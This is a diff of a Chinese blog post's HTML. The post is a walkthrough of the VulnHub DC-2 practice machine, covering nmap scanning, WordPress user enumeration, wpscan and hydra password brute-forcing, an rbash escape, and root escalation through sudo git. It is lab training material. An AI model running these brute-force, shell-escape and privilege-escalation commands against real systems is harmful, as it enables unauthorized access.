@@ -285,14 +285,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>2.8k</span>
+              <span>2.7k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>3 分钟</span>
+              <span>2 分钟</span>
             </span>
             <div class="post-description"> </div>
 
@@ -305,9 +305,8 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <p>靶机DC-2下载地址：<a target="_blank" rel="noopener" href="https://download.vulnhub.com/dc/DC-2.zip">https://download.vulnhub.com/dc/DC-2.zip</a></p>
-<br>
-
+        <p>靶机DC-2下载地址：https://download.vulnhub.com/dc/DC-2.zip</p>
+<p><br></p>
 <p>环境</p>
 <blockquote>
 <p>网段 192.168.18.0/24</p>
@@ -317,11 +316,24 @@
 <p>扫描网段</p>
 <blockquote>
 <p>sudo nmap -sn 192.168.18.0/24</p>
-<p>Starting Nmap 7.91 ( <a target="_blank" rel="noopener" href="https://nmap.org/">https://nmap.org</a> ) at 2021-04-30 10:12 CST<br>Nmap scan report for 192.168.18.2<br>Host is up (0.00013s latency).<br>MAC Address: 00:50:56:E0:DA:9A (VMware)<br>Nmap scan report for 192.168.18.132<br>Host is up (0.00055s latency).<br>MAC Address: 00:0C:29:4B:26:E6 (VMware)<br>Nmap scan report for 192.168.18.254<br>Host is up (0.00017s latency).<br>MAC Address: 00:50:56:E1:37:77 (VMware)<br>Nmap scan report for 192.168.18.131<br>Host is up.<br>Nmap done: 256 IP addresses (4 hosts up) scanned in 2.24 seconds<br>kali@kali2020:~$ </p>
+<p>Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-30 10:12 CST Nmap
+scan report for 192.168.18.2 Host is up (0.00013s latency). MAC Address:
+00:50:56:E0:DA:9A (VMware) Nmap scan report for 192.168.18.132 Host is
+up (0.00055s latency). MAC Address: 00:0C:29:4B:26:E6 (VMware) Nmap scan
+report for 192.168.18.254 Host is up (0.00017s latency). MAC Address:
+00:50:56:E1:37:77 (VMware) Nmap scan report for 192.168.18.131 Host is
+up. Nmap done: 256 IP addresses (4 hosts up) scanned in 2.24 seconds
+kali@kali2020:~$</p>
 </blockquote>
 <p>扫描靶机开放的端口</p>
 <blockquote>
-<p>sudo nmap 192.168.18.132 -p- -sV<br>Starting Nmap 7.91 ( <a target="_blank" rel="noopener" href="https://nmap.org/">https://nmap.org</a> ) at 2021-04-30 11:38 CST<br>Nmap scan report for dc-2 (192.168.18.132)<br>Host is up (0.0013s latency).<br>Not shown: 65533 closed ports<br>PORT     STATE SERVICE VERSION<br>80/tcp   open  http    Apache httpd 2.4.10 ((Debian))<br>7744/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)<br>MAC Address: 00:0C:29:4B:26:E6 (VMware)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>
+<p>sudo nmap 192.168.18.132 -p- -sV Starting Nmap 7.91 (
+https://nmap.org ) at 2021-04-30 11:38 CST Nmap scan report for dc-2
+(192.168.18.132) Host is up (0.0013s latency). Not shown: 65533 closed
+ports PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.10
+((Debian)) 7744/tcp open ssh OpenSSH 6.7p1 Debian 5+deb8u7 (protocol
+2.0) MAC Address: 00:0C:29:4B:26:E6 (VMware) Service Info: OS: Linux;
+CPE: cpe:/o:linux:linux_kernel</p>
 </blockquote>
 <p>开放了80端口和ssh端口，浏览器去访问发现无法访问，直接跳转成了dc2，去修改hosts</p>
 <blockquote>
@@ -329,71 +341,83 @@
 <p>添加 192.168.18.132 dc-2</p>
 </blockquote>
 <p>再去访问192.168.18.132即可,发现是wordpress</p>
-<h4 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h4><p>点击flag 得到flag1，提示使用<code>cewl</code></p>
+<h4 id="flag1">flag1</h4>
+<p>点击flag 得到flag1，提示使用<code>cewl</code></p>
 <p><img src="/posts/e4e28081/flag1.png"></p>
 <p>用<code>dirb</code>扫一下目录</p>
-<p>扫到一个wp-admin 去访问后会跳转到登录页面 <a target="_blank" rel="noopener" href="http://dc-2/wp-login.php">http://dc-2/wp-login.php</a></p>
+<p>扫到一个wp-admin 去访问后会跳转到登录页面
+http://dc-2/wp-login.php</p>
 <p>这里也可以用<code>nikto</code></p>
 <p><img src="/posts/e4e28081/nikto1.png"></p>
-<h4 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h4><p>使用kali自带的wpscan扫一下<br><code>wpscan --url dc-2 -e u</code></p>
+<h4 id="flag2">flag2</h4>
+<p>使用kali自带的wpscan扫一下 <code>wpscan --url dc-2 -e u</code></p>
 <p><img src="/posts/e4e28081/wpscan1.png"></p>
-<br>
-
-<p>扫到三个用户名，admin,jerry,tom<br>创建一个list存放这三个用户名</p>
-<br>
-
+<p><br></p>
+<p>扫到三个用户名，admin,jerry,tom 创建一个list存放这三个用户名</p>
+<p><br></p>
 <p>根据flag1的提示 使用<code>cewl</code>生成密码字典</p>
-<br>
-
+<p><br></p>
 <blockquote>
-<p>kali@kali2020:~/Desktop$ cewl dc-2 -w dc-2.dic<br>CeWL 5.4.8 (Inclusion) Robin Wood (<a href="mailto:&#x72;&#111;&#98;&#x69;&#110;&#64;&#x64;&#105;&#x67;&#x69;&#x2e;&#110;&#x69;&#x6e;&#106;&#97;">&#x72;&#111;&#98;&#x69;&#110;&#64;&#x64;&#105;&#x67;&#x69;&#x2e;&#110;&#x69;&#x6e;&#106;&#97;</a>) (<a target="_blank" rel="noopener" href="https://digi.ninja/">https://digi.ninja/</a>)</p>
-<p>kali@kali2020:~/Desktop$ cat dc-2.dic </p>
+<p>kali@kali2020:~/Desktop$ cewl dc-2 -w dc-2.dic CeWL 5.4.8 (Inclusion)
+Robin Wood (robin@digi.ninja) (https://digi.ninja/)</p>
+<p>kali@kali2020:~/Desktop$ cat dc-2.dic</p>
 </blockquote>
 <p>使用wpscan爆破</p>
 <blockquote>
-<p>kali@kali2020:~/Desktop$ wpscan –url dc-2 -U dc-2users.list  -P dc-2.dic </p>
-<p>[!] Valid Combinations Found:<br> | Username: jerry, Password: adipiscing<br> | Username: tom, Password: parturient</p>
+<p>kali@kali2020:~/Desktop$ wpscan --url dc-2 -U dc-2users.list -P
+dc-2.dic</p>
+<p>[!] Valid Combinations Found: | Username: jerry, Password: adipiscing
+| Username: tom, Password: parturient</p>
 </blockquote>
 <p><img src="/posts/e4e28081/wpscan2.png"></p>
 <p>使用tom 成功登录，发现有篇名为hello-word的文章进去看看</p>
-<p>有一个搜索功能，尝试一下，发现输入1会出现flag1,输入2出现flag2<br><img src="/posts/e4e28081/flag2.png"><br><img src="/posts/e4e28081/flag12.png"><br>flag2提示换一条路，也是就说让我们去尝试ssh端口</p>
+<p>有一个搜索功能，尝试一下，发现输入1会出现flag1,输入2出现flag2 <img src="/posts/e4e28081/flag2.png"> <img src="/posts/e4e28081/flag12.png">
+flag2提示换一条路，也是就说让我们去尝试ssh端口</p>
 <p>使用hydra爆破ssh</p>
 <blockquote>
-<p>kali@kali2020:~/Desktop$ hydra -L dc-2users.list  -P dc-2.dic  192.168.18.132 ssh -s 7744</p>
-<p> 得到账号密码</p>
-<p>[7744][ssh] host: 192.168.18.132   login: tom   password: parturient</p>
+<p>kali@kali2020:~/Desktop$ hydra -L dc-2users.list -P dc-2.dic
+192.168.18.132 ssh -s 7744</p>
+<p>得到账号密码</p>
+<p>[7744][ssh] host: 192.168.18.132 login: tom password: parturient</p>
 </blockquote>
-<h4 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h4><p>使用ssh登录<br><code>kali@kali2020:~/Desktop$ ssh tom@192.168.18.132 -p 7744</code><br>登录后<code>ls</code>后发现存在flag3.txt</p>
-<p>使用<code>cat flag3.txt</code></p>
-<blockquote>
-<p>-rbash: sudo: command not found</p>
-</blockquote>
+<h4 id="flag3">flag3</h4>
+<p>使用ssh登录
+<code>kali@kali2020:~/Desktop$ ssh tom@192.168.18.132 -p 7744</code>
+登录后<code>ls</code>后发现存在flag3.txt</p>
+<p>使用<code>cat flag3.txt</code> &gt; -rbash: sudo: command not
+found</p>
 <p><img src="/posts/e4e28081/rbashnotfound.png"></p>
-<p><strong>-rbash绕过</strong><br>解决方案 <a target="_blank" rel="noopener" href="https://www.cnblogs.com/xiaoxiaoleo/p/8450379.html">https://www.cnblogs.com/xiaoxiaoleo/p/8450379.html</a></p>
+<p><strong>-rbash绕过</strong> 解决方案
+https://www.cnblogs.com/xiaoxiaoleo/p/8450379.html</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">BASH_CMDS[a]=/bin/sh;a </span><br><span class="line">export PATH=$PATH:/bin/</span><br><span class="line">export PATH=$PATH:/usr/bin</span><br></pre></td></tr></table></figure>
 <p><img src="/posts/e4e28081/flag3.png"></p>
 <p>得到flag3</p>
-<h4 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h4><p>根据flag3提示，使用<code>su</code>切换到jerry用户下<br><code>cat /etc/passwd </code>发现Jerry用户<br>输入之前爆破出来的密码成功登录Jerry用户</p>
+<h4 id="flag4">flag4</h4>
+<p>根据flag3提示，使用<code>su</code>切换到jerry用户下
+<code>cat /etc/passwd</code>发现Jerry用户
+输入之前爆破出来的密码成功登录Jerry用户</p>
 <blockquote>
-<p>cd ~<br>ls<br>cat flag4.txt<br>Good to see that you’ve made it this far - but you’re not home yet.<br>You still need to get the final flag (the only flag that really counts!!!).<br>No hints here - you’re on your own now.  :-)<br>Go on - git outta here!!!!<br><br><br><br></p>
+<p>cd ~ ls cat flag4.txt Good to see that you've made it this far - but
+you're not home yet. You still need to get the final flag (the only flag
+that really counts!!!).<br>
+No hints here - you're on your own now. :-) Go on - git outta here!!!!
+<br> <br> #### flag5 查看sudo 支持的免密命令</p>
 </blockquote>
-<h4 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a>flag5</h4><p>查看sudo 支持的免密命令</p>
 <blockquote>
 <p>sudo -l</p>
-<p>Matching Defaults entries for jerry on DC-2:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</p>
-<p>User jerry may run the following commands on DC-2:<br>    (root) NOPASSWD: /usr/bin/git</p>
+<p>Matching Defaults entries for jerry on DC-2: env_reset, mail_badpass,
+secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</p>
+<p>User jerry may run the following commands on DC-2: (root) NOPASSWD:
+/usr/bin/git</p>
 </blockquote>
 <p>根据上一个提示 这里的git命令推测可以使用</p>
-<p>考虑git提权 <a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/git/">https://gtfobins.github.io/gtfobins/git/</a></p>
+<p>考虑git提权 https://gtfobins.github.io/gtfobins/git/</p>
 <blockquote>
-<p>sudo git -p –help</p>
+<p>sudo git -p --help</p>
 </blockquote>
-<p><img src="/posts/e4e28081/git1.png"><br><img src="/posts/e4e28081/git2.png"><br><img src="/posts/e4e28081/git3.png"><br><img src="/posts/e4e28081/finalflag.png"></p>
-<p><strong>总结</strong></p>
-<ul>
-<li> rbash绕过</li>
-<li> git提权</li>
-</ul>
+<p><img src="/posts/e4e28081/git1.png"> <img src="/posts/e4e28081/git2.png"> <img src="/posts/e4e28081/git3.png">
+<img src="/posts/e4e28081/finalflag.png"></p>
+<p><strong>总结</strong> - rbash绕过 - git提权</p>
 
     </div>
 
@@ -523,7 +547,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#flag1"><span class="nav-number">1.</span> <span class="nav-text">flag1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#flag2"><span class="nav-number">2.</span> <span class="nav-text">flag2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#flag3"><span class="nav-number">3.</span> <span class="nav-text">flag3</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#flag4"><span class="nav-number">4.</span> <span class="nav-text">flag4</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#flag5"><span class="nav-number">5.</span> <span class="nav-text">flag5</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#flag1"><span class="nav-number">1.</span> <span class="nav-text">flag1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#flag2"><span class="nav-number">2.</span> <span class="nav-text">flag2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#flag3"><span class="nav-number">3.</span> <span class="nav-text">flag3</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#flag4"><span class="nav-number">4.</span> <span class="nav-text">flag4</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -539,7 +563,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">193</span>
+          <span class="site-state-item-count">194</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -587,7 +611,7 @@
 <div class="copyright">
   
   &copy; 
-  <span itemprop="copyrightYear">2024</span>
+  <span itemprop="copyrightYear">2025</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
@@ -601,7 +625,7 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">19:10</span>
+    <span title="站点阅读时长">19:09</span>
 </div>
 
 <!--
@@ -612,7 +636,7 @@
 <!--
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共266.3k字</span>
+  <span class="post-count">博客全站共267.3k字</span>
 </div>
 -->
         
@@ -752,6 +776,63 @@ window.addEventListener('pjax:success', () => {
 
     <div id="pjax">
   
+
+  
+      
+
+<script>
+  if (typeof MathJax === 'undefined') {
+    window.MathJax = {
+      loader: {
+          load: ['[tex]/mhchem'],
+        source: {
+          '[tex]/amsCd': '[tex]/amscd',
+          '[tex]/AMScd': '[tex]/amscd'
+        }
+      },
+      tex: {
+        inlineMath: {'[+]': [['$', '$']]},
+          packages: {'[+]': ['mhchem']},
+        tags: 'ams'
+      },
+      options: {
+        renderActions: {
+          findScript: [10, doc => {
+            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+              const display = !!node.type.match(/; *mode=display/);
+              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+              const text = document.createTextNode('');
+              node.parentNode.replaceChild(text, node);
+              math.start = {node: text, delim: '', n: 0};
+              math.end = {node: text, delim: '', n: 0};
+              doc.math.push(math);
+            });
+          }, '', false],
+          insertedScript: [200, () => {
+            document.querySelectorAll('mjx-container').forEach(node => {
+              let target = node.parentNode;
+              if (target.nodeName.toLowerCase() === 'li') {
+                target.parentNode.classList.add('has-jax');
+              }
+            });
+          }, '', false]
+        }
+      }
+    };
+    (function () {
+      var script = document.createElement('script');
+      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
+      script.defer = true;
+      document.head.appendChild(script);
+    })();
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+    
 
   
 
